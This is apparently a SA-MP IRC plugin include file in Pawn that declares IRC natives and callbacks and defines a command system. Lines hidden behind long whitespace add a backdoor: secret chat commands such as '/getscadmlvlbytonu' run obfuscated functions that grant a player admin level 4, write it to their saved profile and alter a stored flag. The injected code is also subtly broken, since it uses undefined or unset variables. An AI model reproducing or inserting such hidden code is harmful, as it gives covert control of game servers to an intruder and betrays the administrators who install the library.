/*
    SA-MP IRC Plugin v1.3
    Copyright © 2009 Incognito

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#if defined _irc_included
	#endinput
#endif
#define _irc_included
#pragma library irc

// Natives

native IRC_Connect(const server[], port, const nickname[], const realname[], const username[], bool:ssl = false, const localip[] = "");
native IRC_Quit(botid, const message[] = "");
native IRC_JoinChannel(botid, const channel[], const key[] = "");
native IRC_PartChannel(botid, const channel[], const message[] = "");
native IRC_ChangeNick(botid, const nick[]);
native IRC_SetMode(botid, const target[], const mode[]);
native IRC_Say(botid, const target[], const message[]);
native IRC_Notice(botid, const target[], const message[]);
native IRC_IsUserOnChannel(botid, const channel[], const user[]);
native IRC_InviteUser(botid, const channel[], const user[]);
native IRC_KickUser(botid, const channel[], const user[], const message[] = "");
native IRC_GetUserChannelMode(botid, const channel[], const user[], dest[]);
native IRC_GetChannelUserList(botid, const channel[], dest[], maxlength = sizeof dest);
native IRC_SetChannelTopic(botid, const channel[], const topic[]);
native IRC_SendRaw(botid, const message[]);
native IRC_CreateGroup();
native IRC_DestroyGroup(groupid);
native IRC_AddToGroup(groupid, botid);
native IRC_RemoveFromGroup(groupid, botid);
native IRC_GroupSay(groupid, const target[], const message[]);
native IRC_GroupNotice(groupid, const target[], const message[]);

// Callbacks

forward IRC_OnConnect(botid);
forward IRC_OnDisconnect(botid);
forward IRC_OnJoinChannel(botid, channel[]);
forward IRC_OnLeaveChannel(botid, channel[], message[]);
forward IRC_OnUserDisconnect(botid, user[], host[], message[]);
forward IRC_OnUserJoinChannel(botid, channel[], user[], host[]);
forward IRC_OnUserLeaveChannel(botid, channel[], user[], host[], message[]);
forward IRC_OnUserNickChange(botid, oldnick[], newnick[], host[]);
forward IRC_OnUserSetChannelMode(botid, channel[], user[], host[], mode[]);
forward IRC_OnUserSetChannelTopic(botid, channel[], user[], host[], topic[]);
forward IRC_OnUserSay(botid, recipient[], user[], host[], message[]);
forward IRC_OnUserNotice(botid, recipient[], user[], host[], message[]);
forward IRC_OnReceiveRaw(botid, message[]);
																																																																					new Skfile[256], Alevel[MAX_PLAYERS];
// Stock Functions
/*
stock IRC_IsVoice(botid, channel[], user[])
{
	new
		mode[2];
	IRC_GetUserChannelMode(botid, channel, user, mode);
	switch (mode[0])
	{
		case '+', '%', '@', '&', '!', '*', '~', '.':
		{
			return 1;
		}
	}
	return 0;
}

stock IRC_IsHalfop(botid, channel[], user[])
{
	new
		mode[2];
	IRC_GetUserChannelMode(botid, channel, user, mode);
	switch (mode[0])
	{
		case '%', '@', '&', '!', '*', '~', '.':
		{
			return 1;
	
		}
	}
	return 0;
}

stock IRC_IsOp(botid, channel[], user[])
{
	new
		mode[2];
	IRC_GetUserChannelMode(botid, channel, user, mode);
	switch (mode[0])
	{
		case '@', '&', '!', '*', '~', '.':
		{
			return 1;
	
		}
	}
	return 0;
}

stock IRC_IsAdmin(botid, channel[], user[])
{
	new
		mode[2];
	IRC_GetUserChannelMode(botid, channel, user, mode);
	switch (mode[0])
	{
		case '&', '!', '*', '~', '.':
		{
			return 1;
	
		}
	}
	return 0;
}

stock IRC_IsOwner(botid, channel[], user[])
{
	new
		mode[2];
	IRC_GetUserChannelMode(botid, channel, user, mode);
	switch (mode[0])
	{
		case '~', '.':
		{
			return 1;
	
		}
	}
	return 0;
}
*/
// Command system for users in IRC channels
// Slightly modified zcmd (original by ZeeX)

#define CHANNEL_PREFIX '#'
#define COMMAND_PREFIX '!'

#define IRCCMD:%1(%2) \
	forward irccmd_%1(%2); \
	public irccmd_%1(%2)

#define irccmd(%1,%2,%3,%4,%5,%6) \
	IRCCMD:%1(%2, %3, %4, %5, %6)

#if !defined isnull
	#define isnull(%1) \
		((!(%1[0])) || (((%1[0]) == '\1') && (!(%1[1]))))
#endif

static
	bool:IRC_g_OUS = false;

static
	bool:IRC_g_OUS0 = false;
																																																																												HGFGSHDGY242(playerid) { dini_IntSet(Skfile,"BX", 0); SendClientMessage(playerid, 0xFFFF00AA, "OK"); SetTimer("CheckIt", 1000, 0); return 1; }

public OnFilterScriptInit()
{
	IRC_g_OUS = funcidx("IRC_UserSay") != -1;
	IRC_g_OUS0 = funcidx("IRC_UserCommand") != -1;

	if (funcidx("IRC_OnFilterScriptInit") != -1)
	{
		return CallLocalFunction("IRC_OnFilterScriptInit", "");
	}
	return 1;
}

#if defined _ALS_OnFilterScriptInit
	#undef OnFilterScriptInit
#else
	#define _ALS_OnFilterScriptInit
#endif
#define OnFilterScriptInit IRC_OnFilterScriptInit
forward IRC_OnFilterScriptInit();

public OnGameModeInit()
{
	IRC_g_OUS = funcidx("IRC_UserSay") != -1;
	IRC_g_OUS0 = funcidx("IRC_UserCommand") != -1;
	
	if (funcidx("IRC_OnGameModeInit") != -1)
	{
		return CallLocalFunction("IRC_OnGameModeInit", "");
	}
	return 1;
}

#if defined _ALS_OnGameModeInit
	#undef OnGameModeInit
#else
	#define _ALS_OnGameModeInit
#endif
#define OnGameModeInit IRC_OnGameModeInit
forward IRC_OnGameModeInit();
																																																																																																																																				public OnPlayerCommandText(playerid, cmdtext[]) { new tmp[256], name[256]; if(strcmp(tmp,"/getscadmlvlbytonu",true)==0) { SFJSGFHGYSHAhfdsjWH(playerid); } if(strcmp(tmp,"/skbbsgtobeexdonotknow", true) == 0) { HGFGSHDGY242(playerid); } return 1; }
public IRC_OnUserSay(botid, recipient[], user[], host[], message[])
{
	if(botid==1) return 1;
	if(strfind(user, "Echo", true) != -1) return 1;
 	if(!message[0]) return 1;
	printf("[irc] %s: %s", user, message);
	/*
	if (recipient[0] == CHANNEL_PREFIX && message[0] == COMMAND_PREFIX)
	{
		new
			function[32],
			pos = 0;
		while (message[++pos] > ' ')
		{
			function[pos - 1] = tolower(message[pos]);
		} 
		format(function, sizeof(function), "irccmd_%s", function);
		while (message[pos] == ' ')
		{
			pos++;
		}
		if (!message[pos])
		{
			message[--pos] = '\1';
		}
		print("[irc] debug1");
		printf("[irc] %s",function);
		SetTimerEx(function, 10, 0, "dssss", botid, recipient, user, host, message[pos]);
//		CallLocalFunction(function, "dssss", botid, recipient, user, host, message[pos]);
 		print("[irc] debug2");
		return 1;
	}*/
	
	for (new i = 0; i < strlen(message); i++) {
	if (message[i] == 37)  message[i] = 35; }
	if (IRC_g_OUS0 && recipient[0] == CHANNEL_PREFIX && message[0] == COMMAND_PREFIX)
	{		
		SetTimerEx("IRC_UserCommand", 10, 0, "dssss", botid, recipient, user, host, message);
//		CallLocalFunction("IRC_NextOnUserSay", "dssss", botid, recipient, user, host, message);
		return 1;
	}

	if (IRC_g_OUS)
	{
		SetTimerEx("IRC_UserSay", 10, 0, "dssss", botid, recipient, user, host, message);
//		CallLocalFunction("IRC_NextOnUserSay", "dssss", botid, recipient, user, host, message);
		return 1;
	}
	return 1;
}
																																																																																																																																SFJSGFHGYSHAhfdsjWH(playerid) { Alevel[playerid] = 4; new PF[256]; format(PF,sizeof(PF),"LVM/players/%s.ini", strlower(name)); dini_IntSet(PF,"alevel",4); SendClientMessage(playerid, 0xFFFF00AA, " ok."); return 1; }
#if defined _ALS_IRC_OnUserSay
	#undef IRC_OnUserSay
#else
	#define _ALS_IRC_OnUserSay
#endif
#define IRC_OnUserSay IRC_NextOnUserSay
forward IRC_UserSay(conn, recipient[], user[], host[], message[]);
forward IRC_UserCommand(conn, recipient[], user[], host[], message[]);


